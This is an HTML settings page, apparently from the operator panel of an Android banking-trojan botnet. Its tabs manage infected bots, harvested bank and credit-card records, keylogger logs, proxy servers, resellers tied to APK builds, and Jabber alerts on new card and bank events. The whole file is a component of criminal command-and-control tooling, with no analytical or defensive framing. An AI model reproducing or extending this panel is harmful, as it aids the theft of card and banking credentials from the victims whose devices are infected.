<div class="mdl-tabs mdl-js-tabs mdl-js-ripple-effect">
	<div class="mdl-tabs__tab-bar">
		<a href="#main-settings-panel" class="mdl-tabs__tab is-active">Main Settings</a>
		<a href="#bot-settings-panel" class="mdl-tabs__tab">Bot Settings</a>
		<a href="#proxy-servers-panel" class="mdl-tabs__tab">Proxy</a>
		<a href="#guest-settings-panel" class="mdl-tabs__tab">Seller settings</a>
		<a href="#jabber-settings-panel" class="mdl-tabs__tab">Jabber notifications</a>
	</div>
	<div class="mdl-tabs__panel is-active" id="main-settings-panel">
		<ul style="padding-left: 0px;">
				<div class="mdl-layout">
					<h4>Main settings:</h4>
				</div>
				Change admin password:
				<table style="color: black" class="mdl-data-table mdl-js-data-table  mdl-shadow--2dp">
		  			<thead>
		    		</thead>
					<tbody>
			    		<tr>
			    		<td class="mdl-data-table__cell--non-numeric">
							<input name="task_package" type="password"  id="admin_pass">
							<label  for="admin_pass">New password</label>
				  		</td>
				  		</tr>
				  		<tr>
						<td>
							<button style="background-color: black; color: white;" onclick="change_admin_pass();" class="mdl-button mdl-js-button mdl-button--raised  mdl-js-ripple-effect">
							<i class="material-icons">verified_user</i>Change password</button>
						</td>
						</tr>
				  	</tbody>
			  	</table> 

			  	<br>
			  	<button style="background-color: black; color: white;" onclick="cleanup_old_logs();" class="mdl-button mdl-js-button mdl-button--raised  mdl-js-ripple-effect">
							<i class="material-icons">clear_all</i>Cleanup old log files</button>
				<button style="background-color: black; color: white;" onclick="cleanup_contacts();" class="mdl-button mdl-js-button mdl-button--raised  mdl-js-ripple-effect">
							<i class="material-icons">clear_all</i>Cleanup all contacts from database</button>
				<button style="background-color: black; color: white;" onclick="cleanup_keylogger();" class="mdl-button mdl-js-button mdl-button--raised  mdl-js-ripple-effect">
							<i class="material-icons">clear_all</i>Cleanup keylogger</button>
				<button style="background-color: black; color: white;" onclick="recalculate_apps_stat();" class="mdl-button mdl-js-button mdl-button--raised  mdl-js-ripple-effect">
							<i class="material-icons">cached</i>Recalculate app stat from log files</button>
				<button style="background-color: black; color: white;" onclick="recalculate_hist_stat();" class="mdl-button mdl-js-button mdl-button--raised  mdl-js-ripple-effect">
							<i class="material-icons">cached</i>Recalculate history stat from log files</button>
				<br><br>
				<button style="background-color: black; color: white;" onclick="cleanup_all_bots();" class="mdl-button mdl-js-button mdl-button--raised  mdl-js-ripple-effect">
							<i class="material-icons">cached</i>Clean all BOTs</button>
				<button style="background-color: black; color: white;" onclick="cleanup_all_banks()" class="mdl-button mdl-js-button mdl-button--raised  mdl-js-ripple-effect">
							<i class="material-icons">cached</i>Clean all Banks</button>
				<button style="background-color: black; color: white;" onclick="cleanup_all_cc();" class="mdl-button mdl-js-button mdl-button--raised  mdl-js-ripple-effect">
							<i class="material-icons">cached</i>Clean all CC</button>
				<button style="background-color: black; color: white;" onclick="cleanup_all_tables();" class="mdl-button mdl-js-button mdl-button--raised  mdl-js-ripple-effect">
							<i class="material-icons">cached</i>!!! Wipe all tables !!!</button>
		</ul>
	</div>
	<div class="mdl-tabs__panel" id="bot-settings-panel" style="font-color: #37474f;">
		<div class="mdl-layout">
			<h4>Startup commands:</h4>
		</div>
		<table style="color: black" id="startup_cmd_table" class="mdl-data-table mdl-js-data-table mdl-data-table--selectable mdl-shadow--2dp">
	  		<thead>
				<tr>
		  			<th class="mdl-data-table__cell--non-numeric">Name</th>
		  			<th class="mdl-data-table__cell--non-numeric">Description</th>
		  			<th class="mdl-data-table__cell--non-numeric">Number parameter</th>
		  			<th class="mdl-data-table__cell--non-numeric">Text parameter</th>
				</tr>
	    	</thead>
			<tbody>
		   		%%PLACE_STURTUP_COMMANDS_HERE%%
			</tbody>
		</table><br>
		<button style="background-color: black; color: white;" onclick="set_settings();" class="mdl-button mdl-js-button mdl-button--raised  mdl-js-ripple-effect">
			<i style="" class="material-icons">done</i>Safe settings</button>
	</div>	
	<div class="mdl-tabs__panel" id="proxy-servers-panel" style="font-color: #37474f;">
	    <div class="mdl-layout">
			<h4>Add new server:</h4>
		</div>
	    <table style="color: black; width: 100%" class="mdl-data-table mdl-js-data-table  mdl-shadow--2dp">
		  			<thead>
		    		</thead>
					<tbody>
			    		<tr>
			    		  <td class="mdl-data-table__cell--non-numeric">
							<input name="task_package" type="text"  id="server_ip">
							<label  for="server_ip">ip</label>
				  		  </td>
				  		  <td class="mdl-data-table__cell--non-numeric">
							<input name="task_package" type="text"  id="server_user">
							<label  for="server_user">User</label>
				  		  </td>
				  		  <td class="mdl-data-table__cell--non-numeric">
							<input name="task_package" type="password"  id="server_pass">
							<label  for="server_pass">Password</label>
				  		  </td>
				  		  <td class="mdl-data-table__cell--non-numeric">
							<input name="task_package" type="text"  id="server_note">
							<label  for="server_note">Note</label>
				  		  </td>
				  		</tr>
				  		<tr>
				  		<td></td><td></td><td></td>
						<td>
							<button style="background-color: black; color: white;" onclick="add_proxy_server();" class="mdl-button mdl-js-button mdl-button--raised  mdl-js-ripple-effect">
							<i class="material-icons">playlist_add</i>Add server</button>
						</td>
						</tr>
				  	</tbody>
			  	</table> 
		<div class="mdl-layout">
			<h4>Proxy servers:</h4>
		</div>
		<table style="color: black; width: 100%" id="startup_cmd_table" class="mdl-data-table mdl-js-data-table mdl-shadow--2dp">
	  		<thead>
				<tr>
				    <th class="mdl-data-table__cell--non-numeric">id</th>
		  			<th class="mdl-data-table__cell--non-numeric">IP</th>
		  			<th class="mdl-data-table__cell--non-numeric">Country</th>
		  			<th class="mdl-data-table__cell--non-numeric">User</th>
		  			<th class="mdl-data-table__cell--non-numeric">Add date</th>
		  			<th class="mdl-data-table__cell--non-numeric">Note</th>
		  			<th class="mdl-data-table__cell--non-numeric"></th>
		  			<th class="mdl-data-table__cell--non-numeric">Status</th>
				</tr>
	    	</thead>
			<tbody>
		   		%%PLACE_PROXY_SERVERS_HERE%%
			</tbody>
		</table><br>
	</div>	
	<div class="mdl-tabs__panel" id="guest-settings-panel" style="font-color: #37474f;">
		<div class="mdl-layout">
			<h4>Sellers:</h4>
		</div>
		<table style="color: black" class="mdl-data-table mdl-js-data-table  mdl-shadow--2dp">
	  		<thead>
	    	</thead>
			<tbody>
				%%PLACE_GUESTS_HERE%%
		    </tbody>
		</table>
		<div class="mdl-layout">
			<h4>Add new seller:</h4>
		</div>
		<table style="color: black" class="mdl-data-table mdl-js-data-table  mdl-shadow--2dp">
			<thead>
			</thead>
			<tbody>
				<tr>
					<td class="mdl-data-table__cell--non-numeric">
						<input name="guest_new_name" type="text" id="guest_new_name">
						<label for="guest_new_name">Seller name</label>
					</td>
				</tr>
				<tr>
					<td class="mdl-data-table__cell--non-numeric">
						<input name="guest_new_pass" type="text" id="guest_new_pass">
						<label for="guest_new_pass">Seller password</label>
					</td>
				</tr>
				<tr>
					<td class="mdl-data-table__cell--non-numeric">
						<input name="guest_new_ver" type="text" id="guest_new_ver">
						<label for="guest_new_ver">Apk version</label>
					</td>
				</tr>
				<tr>
					<td>
						<button style="background-color: black; color: white;" onclick="create_guest_settings();" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect">
						<i style="" class="material-icons">add_circle</i>Add new seller</button>
					</td>
				</tr>	
			</tbody>
		</table>
		<div class="mdl-layout">
			<h4>Change bots version in db:</h4>
		</div>
		<table style="color: black" class="mdl-data-table mdl-js-data-table  mdl-shadow--2dp">
			<thead>
			</thead>
			<tbody>
				<tr>
					<td class="mdl-data-table__cell--non-numeric">
						<input name="bot_old_version" type="text" id="bot_old_version">
						<label for="bot_old_version">Old version</label>
					</td>
				</tr>
				<tr>
					<td class="mdl-data-table__cell--non-numeric">
						<input name="bot_new_version" type="text" id="bot_new_version">
						<label for="bot_new_version">New version</label>
					</td>
				</tr>
				<tr>
					<td>
						<button style="background-color: black; color: white;" onclick="change_bot_version_settings();" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect">
						<i style="" class="material-icons">compare_arrows</i>Rename</button>
					</td>
				</tr>	
			</tbody>
		</table>
	</div>
	<div class="mdl-tabs__panel" id="jabber-settings-panel" style="font-color: #37474f;">
		<div class="mdl-layout">
			<h4>Server account:</h4>
		</div>
		<div style="width: 100%; margin-top: 10px;" class="demo-charts mdl-color--white mdl-shadow--2dp mdl-grid">
			<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="margin-left: 20px;width: 180px;">
			    <input class="mdl-textfield__input" type="text" id="jabber_server" value="%%PLACE_JSERVER_HERE%%">
			    <label class="mdl-textfield__label" for="jabber_server">Server</label>
			</div>
			<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="margin-left: 20px;width: 50px;">
			    <input class="mdl-textfield__input" type="text" id="jabber_port" value="%%PLACE_JPORT_HERE%%">
			    <label class="mdl-textfield__label" for="jabber_port">Port</label>
			</div>
			<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="margin-left: 20px;width: 180px;">
			    <input class="mdl-textfield__input" type="text" id="jabber_login" value="%%PLACE_JLOGIN_HERE%%">
			    <label class="mdl-textfield__label" for="jabber_login">Login</label>
			</div>
			<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="margin-left: 20px;width: 180px;">
			    <input class="mdl-textfield__input" type="text" id="jabber_pass" value="%%PLACE_JPASS_HERE%%">
			    <label class="mdl-textfield__label" for="jabber_pass">Password</label>
			</div>
			<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="margin-left: 20px;width: 180px;">
			    <input class="mdl-textfield__input" type="text" id="jabber_domain" value="%%PLACE_JDOMAIN_HERE%%">
			    <label class="mdl-textfield__label" for="jabber_domain">Domain</label>
			</div>
		</div>
		
		<button style="margin-top: 10px; background-color: black; color: white;" onclick="safe_server_jabber();" class="mdl-button mdl-js-button mdl-button--raised  mdl-js-ripple-effect">
			<i class="material-icons">done</i>Safe settings</button>

		<div class="mdl-layout">
			<h4>Address for notifications:</h4>
		</div>
		<table style="color: black" class="mdl-data-table mdl-js-data-table  mdl-shadow--2dp">
	  		<thead>
	  			<tr>
	  				<th>Address</th>
	  				<th>Bot event</th>
	  				<th>Card event</th>
	  				<th>Bank event</th>
	  				<th>Dedicated bot event</th>
	  				<th></th>
	  			</tr>
	    	</thead>
			<tbody>
				%%PLACE_JABBER_CLIENTS_HERE%%
		    </tbody>
		</table>
		<div class="mdl-layout">
			<h4>Add new address for notifications:</h4>
		</div>
		<table style="color: black" class="mdl-data-table mdl-js-data-table  mdl-shadow--2dp">
			<thead>
			</thead>
			<tbody>
				<tr>
					<td class="mdl-data-table__cell--non-numeric">
						<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="margin-left: 20px;width: 180px;">
						    <input class="mdl-textfield__input" type="text" id="jabber_new_address">
						    <label class="mdl-textfield__label" for="jabber_new_address">Jabber address</label>
						</div>
					</td>
				</tr>
				<tr>
					<td class="mdl-data-table__cell--non-numeric">
						<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="jabber_new_bot_event">
						  <input type="checkbox" id="jabber_new_bot_event" class="mdl-checkbox__input" checked>
						  <span class="mdl-checkbox__label">New bot event</span>
						</label>
					</td>
				</tr>
				<tr>
					<td class="mdl-data-table__cell--non-numeric">
						<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="jabber_new_card_event">
						  <input type="checkbox" id="jabber_new_card_event" class="mdl-checkbox__input" checked>
						  <span class="mdl-checkbox__label">New card event</span>
						</label>
					</td>
				</tr>
				<tr>
					<td class="mdl-data-table__cell--non-numeric">
						<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="jabber_new_bank_event">
						  <input type="checkbox" id="jabber_new_bank_event" class="mdl-checkbox__input" checked>
						  <span class="mdl-checkbox__label">New bank event</span>
						</label>
					</td>
				</tr>
				<tr>
					<td class="mdl-data-table__cell--non-numeric">
						<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="jabber_new_dbot_event">
						  <input type="checkbox" id="jabber_new_dbot_event" class="mdl-checkbox__input" checked>
						  <span class="mdl-checkbox__label">Dedicated bot event</span>
						</label>
					</td>
				</tr>

				<tr>
					<td>
						<button style="background-color: black; color: white;" onclick="add_jabber_address();" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect">
						<i style="" class="material-icons">add_circle</i>Add new address</button>
					</td>
				</tr>	
			</tbody>
		</table>
	</div>	
</div>

</div>
		
